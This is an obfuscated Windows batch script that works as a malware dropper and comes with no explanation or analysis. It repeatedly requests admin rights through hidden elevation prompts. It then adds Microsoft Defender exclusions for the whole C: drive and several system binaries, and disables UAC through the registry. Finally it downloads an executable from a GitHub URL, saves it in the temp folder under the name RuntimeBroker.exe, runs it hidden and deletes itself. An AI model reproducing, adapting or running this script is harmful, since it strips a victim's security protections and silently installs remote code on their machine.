@echo off & setlocal enableDelayedExpansion
set "ByusM=2>&1" & set "VJU=>nul" & set "RKO=NET" & set "uIrVT=SESSION"
%RKO% %uIrVT% %VJU% %ByusM%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "vgCef=qux" & set "haqo=baz" & set "hcP=bar" & set "GFFNG=foo" & rem EAskMrz GaQ eTNjgmp
set "lKMvi=powershell -ExecutionPolicy Bypass -Command"
set "JbP=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "psvxj='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "Dip='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!lKMvi! "!JbP! !psvxj! !Dip!" %VJU% %ByusM%
set "mnpIw=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "Ssr=-Name 'EnableLUA' -Value 0"
!lKMvi! "!mnpIw! !Ssr!" %VJU% %ByusM%
set "qcf=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!lKMvi! "!qcf!" %VJU% %ByusM%
if !errorlevel! neq 0 (goto %a%)
set "XIXxh=timeout /t" & !XIXxh! 2 %VJU% %ByusM%
set "adkn=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "hOIAL=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "rWf=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!lKMvi! "!adkn! !hOIAL! !rWf!" %VJU% %ByusM%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!XIXxh! 1 %VJU% %ByusM% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %VJU% %ByusM%
del /f /q "%~f0" %VJU% %ByusM%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %VJU% %ByusM%
if !errorlevel! neq 0 (!XIXxh! 3 %VJU% %ByusM% & goto %b%)
exit /b
